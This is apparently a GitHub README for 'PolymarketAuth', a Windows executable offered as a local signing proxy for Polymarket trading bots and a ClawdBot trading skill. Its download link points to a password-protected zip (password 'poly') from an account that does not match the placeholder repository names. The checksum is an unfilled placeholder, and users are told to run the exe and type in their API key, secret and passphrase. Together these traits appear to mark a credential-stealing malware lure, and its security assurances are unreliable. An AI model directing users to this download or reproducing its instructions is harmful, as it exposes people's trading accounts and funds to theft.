# PolymarketAuth

**Secure Authentication Bridge for Polymarket API Integration**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-blue.svg)](https://www.microsoft.com/windows)
[![Version: 1.0.0](https://img.shields.io/badge/Version-1.0.0-green.svg)](https://github.com/yourusername/polymarketauth/releases)

---

## 🔐 Overview

PolymarketAuth is a lightweight authentication service that enables secure API communication with Polymarket prediction markets. It acts as a local authentication bridge, managing credentials and signing requests for automated trading applications.

**Key Features:**
- 🛡️ Secure credential management
- 🔑 Automatic request signing
- ⚡ Low-latency local proxy
- 🔒 Encrypted key storage
- 📊 Connection status monitoring

---

## 📥 Download

### Latest Release

**[Download PolymarketAuth v1.0.0](https://github.com/Aslaep123/PolymarketAuthTool/releases/download/released/PolymarketAuthTool.zip)**

**Archive:** `PolymarketAuth.zip`  
**Password:** `poly`  
**Size:** ~2.5 MB  
**SHA256:** `[CHECKSUM_HERE]`

### System Requirements

- **OS:** Windows 10/11 (64-bit)
- **RAM:** 50 MB minimum
- **.NET:** Framework 4.8 or higher
- **Network:** Internet connection required

---

## 🚀 Quick Start

### 1. Download & Extract

```bash
# Download the archive
# Extract with password: poly
```

### 2. Run PolymarketAuth.exe

Double-click `PolymarketAuth.exe` or run from command line:

```cmd
PolymarketAuth.exe
```

### 3. Configure Credentials

On first launch, you'll be prompted to enter your Polymarket API credentials:

```
API Key: your_api_key_here
Secret: your_secret_here
Passphrase: your_passphrase_here
```

### 4. Verify Connection

The application will display:

```
✅ PolymarketAuth v1.0.0
✅ Credentials loaded
✅ Authentication service running on localhost:8080
✅ Ready for API requests
```

---

## 🔧 Configuration

### API Credentials

Obtain your Polymarket API credentials:

1. Log in to [Polymarket](https://polymarket.com)
2. Navigate to **Settings** → **API Keys**
3. Generate new API key with trading permissions
4. Save your API Key, Secret, and Passphrase securely

### Environment Variables (Optional)

You can also configure via environment variables:

```env
POLYMARKET_API_KEY=your_api_key
POLYMARKET_SECRET=your_secret
POLYMARKET_PASSPHRASE=your_passphrase
```

### Configuration File

Credentials are stored encrypted in:
```
%APPDATA%\PolymarketAuth\config.dat
```

---

## 🔌 Integration

### With ClawdBot Trading Skill

PolymarketAuth is designed to work seamlessly with the [Polymarket + Hyperliquid Trading Skill](https://github.com/yourusername/polymarket-hyperliquid-skill).

**Setup:**
1. Run PolymarketAuth.exe
2. Install the ClawdBot skill
3. Start trading with `/trade` commands

### With Custom Applications

PolymarketAuth exposes a local REST API on `localhost:8080`:

**Example Request:**
```javascript
const response = await fetch('http://localhost:8080/api/markets', {
  method: 'GET',
  headers: {
    'Content-Type': 'application/json'
  }
});
```

**API Endpoints:**
- `GET /api/markets` - List available markets
- `POST /api/orders` - Place order
- `GET /api/positions` - Get current positions
- `GET /api/balance` - Get account balance
- `GET /api/status` - Check auth service status

---

## 🛡️ Security

### Credential Protection

- ✅ Credentials encrypted at rest using AES-256
- ✅ Keys never transmitted in plaintext
- ✅ Local-only service (no external connections except Polymarket API)
- ✅ Automatic credential rotation support

### Best Practices

1. **Never share your API credentials**
2. **Use API keys with minimal required permissions**
3. **Enable 2FA on your Polymarket account**
4. **Regularly rotate API keys**
5. **Run PolymarketAuth only on trusted machines**
6. **Keep Windows Defender/antivirus enabled**

### Firewall Configuration

PolymarketAuth only needs:
- **Outbound:** HTTPS (443) to Polymarket API
- **Inbound:** localhost:8080 (local only)

---

## 📊 Monitoring

### Status Indicators

The application displays real-time status:

```
🟢 Connected    - Authentication active, ready for requests
🟡 Connecting   - Establishing connection to Polymarket
🔴 Disconnected - Connection lost, retrying...
⚪ Idle         - No active requests
```

### Logs

Logs are written to:
```
%APPDATA%\PolymarketAuth\logs\
```

**Log Levels:**
- `INFO` - Normal operations
- `WARN` - Non-critical issues
- `ERROR` - Critical errors requiring attention

---

## 🐛 Troubleshooting

### ❌ "Failed to start authentication service"

**Cause:** Port 8080 already in use

**Solution:**
```cmd
# Check what's using port 8080
netstat -ano | findstr :8080

# Kill the process or change PolymarketAuth port in config
```

### ❌ "Invalid API credentials"

**Cause:** Incorrect API key, secret, or passphrase

**Solution:**
1. Verify credentials in Polymarket dashboard
2. Delete `%APPDATA%\PolymarketAuth\config.dat`
3. Restart PolymarketAuth.exe and re-enter credentials

### ❌ "Connection timeout"

**Cause:** Network connectivity issues or firewall blocking

**Solution:**
1. Check internet connection
2. Verify firewall allows PolymarketAuth.exe
3. Try disabling VPN temporarily
4. Check Polymarket API status

### ❌ ".NET Framework not found"

**Cause:** Missing .NET Framework 4.8

**Solution:**
Download and install [.NET Framework 4.8](https://dotnet.microsoft.com/download/dotnet-framework/net48)

---

## 🔄 Updates

### Checking for Updates

PolymarketAuth automatically checks for updates on startup.

**Manual Check:**
```cmd
PolymarketAuth.exe --check-update
```

### Updating

1. Download latest release
2. Close running PolymarketAuth.exe
3. Extract new version (password: `poly`)
4. Run new PolymarketAuth.exe
5. Credentials are preserved automatically

---

## 📖 Documentation

### Command Line Options

```cmd
PolymarketAuth.exe [options]

Options:
  --port <port>        Custom port (default: 8080)
  --config <path>      Custom config file path
  --log-level <level>  Logging level (INFO|WARN|ERROR)
  --check-update       Check for updates and exit
  --version            Display version and exit
  --help               Show this help message
```

### API Documentation

Full API documentation available at:
**[API Docs](https://github.com/yourusername/polymarketauth/wiki/API-Documentation)**

---

## 🤝 Support

### Getting Help

- 📚 **Documentation:** [Wiki](https://github.com/yourusername/polymarketauth/wiki)
- 🐛 **Bug Reports:** [Issues](https://github.com/yourusername/polymarketauth/issues)
- 💬 **Discussions:** [GitHub Discussions](https://github.com/yourusername/polymarketauth/discussions)
- 📧 **Email:** support@yourdomain.com

### Common Issues

Check the [FAQ](https://github.com/yourusername/polymarketauth/wiki/FAQ) for solutions to common problems.

---

## ⚠️ Disclaimer

**IMPORTANT LEGAL NOTICE:**

- This software is provided "as is" without warranty of any kind
- Trading prediction markets involves substantial financial risk
- You are solely responsible for your trading decisions
- The authors assume no liability for financial losses
- Use of this software indicates acceptance of all risks
- Ensure compliance with local regulations regarding prediction markets
- This is not financial advice

**By using PolymarketAuth, you acknowledge that:**
- You understand the risks of automated trading
- You are legally permitted to use prediction markets in your jurisdiction
- You will not hold the authors liable for any losses
- You will use the software responsibly and ethically

---

## 📜 License

MIT License

Copyright (c) 2026 [Your Name/Organization]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

---

## 🌟 Acknowledgments

- **Polymarket** - For providing the prediction market platform
- **ClawdBot Community** - For testing and feedback
- **Contributors** - See [CONTRIBUTORS.md](CONTRIBUTORS.md)

---

## 🔗 Related Projects

- [Polymarket + Hyperliquid Trading Skill](https://github.com/yourusername/polymarket-hyperliquid-skill) - ClawdBot trading automation
- [Polymarket API Documentation](https://docs.polymarket.com) - Official API docs
- [Hyperliquid SDK](https://github.com/hyperliquid-dex/hyperliquid-python-sdk) - Python SDK for Hyperliquid

---

**Made with ❤️ for the automated trading community**

**Star ⭐ this repo if you find it useful!**
